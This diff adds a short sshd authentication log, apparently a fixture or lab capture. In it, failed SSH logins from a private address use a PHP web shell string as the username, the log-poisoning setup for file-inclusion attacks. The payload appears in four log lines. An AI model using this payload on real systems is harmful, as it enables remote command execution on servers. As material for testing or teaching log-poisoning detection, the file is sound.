@@ -1,0 +1,12 @@
+Dec 14 01:35:32 localhost systemd: pam_unix(systemd-user:session): session closed for user root
+Dec 14 01:35:32 localhost sshd[686]: Received signal 15; terminating.
+Dec 14 01:37:07 localhost sshd[686]: Server listening on 0.0.0.0 port 22.
+Dec 14 01:37:07 localhost sshd[686]: Server listening on :: port 22.
+Dec 14 01:39:06 localhost sshd[1905]: Invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1
+Dec 14 01:39:06 localhost sshd[1905]: input_userauth_request: invalid user <?php system($_GET["cmd"]);?> [preauth]
+Dec 14 01:39:08 localhost sshd[1905]: pam_unix(sshd:auth): check pass; user unknown
+Dec 14 01:39:08 localhost sshd[1905]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.56.1
+Dec 14 01:39:10 localhost sshd[1905]: Failed password for invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1 port 46636 ssh2
+Dec 14 01:39:10 localhost sshd[1905]: error: maximum authentication attempts exceeded for invalid user <?php system($_GET["cmd"]);?> from 192.168.56.1 port 46636 ssh2 [preauth]
+Dec 14 01:39:10 localhost sshd[1905]: Disconnecting: Too many authentication failures [preauth]
+Dec 14 01:39:23 localhost sshd[686]: Received signal 15; terminating.
